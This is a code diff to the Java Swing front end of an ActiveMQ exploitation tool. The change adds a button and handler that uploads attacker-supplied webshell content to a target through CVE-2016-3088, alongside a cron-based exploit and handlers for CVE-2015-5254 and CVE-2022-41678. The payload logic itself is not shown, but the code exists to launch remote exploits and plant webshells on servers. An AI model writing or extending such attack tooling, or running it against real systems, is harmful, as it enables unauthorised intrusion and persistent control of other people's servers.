@@ -24,7 +24,7 @@ public class MainFrame extends JFrame {
     private VulnerabilityService vulnerabilityService;
     
     public MainFrame() {
-        setTitle("Activemq Exploit 1.0 - by kiiy(https://github.com/Catherines77/ActiveMQ-EXPtools)");
+        setTitle("ActiveMQ-EXPtools-1.0 - by kiiy(https://github.com/Catherines77/ActiveMQ-EXPtools)");
         setSize(1100, 700);
         setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         setLocationRelativeTo(null);
@@ -71,7 +71,9 @@ public class MainFrame extends JFrame {
         
         cve20155254Panel.addExecuteListener(e -> sendCustomPayload());
         
-        cve20163088Panel.addExecuteListener(e -> exploitCVE20163088());
+        cve20163088Panel.addExecuteCronListener(e -> exploitCVE20163088());
+        cve20163088Panel.addExecuteWebshellListener(e -> exploitCVE20163088Webshell());
+
         
         cve202241678Panel.addExecuteListener(e -> exploitCVE202241678());
         cve202241678Panel.addWriteWebshellListener(e -> writeWebshellCVE202241678());
@@ -174,18 +176,41 @@ public class MainFrame extends JFrame {
         String port = cve20163088Panel.getPort();
         
         if (ip.isEmpty() || port.isEmpty()) {
-            cve20163088Panel.setResult("错误：监听 IP 和端口不能为空！");
+            cve20163088Panel.setCronResult("错误：监听 IP 和端口不能为空！");
             return;
         }
         
-        cve20163088Panel.setResult("正在执行 CVE-2016-3088 (Cron) 漏洞利用...");
+        cve20163088Panel.setCronResult("正在执行 CVE-2016-3088 (Cron) 漏洞利用...");
         
         new Thread(() -> {
             String result = vulnerabilityService.exploitCVE20163088(url, ip, port);
-            SwingUtilities.invokeLater(() -> cve20163088Panel.setResult(result));
+            SwingUtilities.invokeLater(() -> cve20163088Panel.setCronResult(result));
         }).start();
     }
     
+    private void exploitCVE20163088Webshell() {
+        String url = topPanel.getTargetAddress();
+        if (url.isEmpty()) {
+            JOptionPane.showMessageDialog(this, "请输入目标地址！");
+            return;
+        }
+
+        String username = topPanel.getUsername();
+        String password = topPanel.getPassword();
+        String webshellContent = cve20163088Panel.getWebshellContent();
+        if (webshellContent == null || webshellContent.trim().isEmpty()) {
+            cve20163088Panel.setWebshellResult("错误：Webshell 内容不能为空！");
+            return;
+        }
+
+        cve20163088Panel.setWebshellResult("正在执行 CVE-2016-3088 (Webshell) 漏洞利用...\n");
+
+        new Thread(() -> {
+            String result = vulnerabilityService.exploitCVE20163088Webshell(url, username, password, webshellContent);
+            SwingUtilities.invokeLater(() -> cve20163088Panel.setWebshellResult(result));
+        }).start();
+    }
+
     private void exploitCVE202241678() {
         String url = topPanel.getTargetAddress();
         if (url.isEmpty()) {
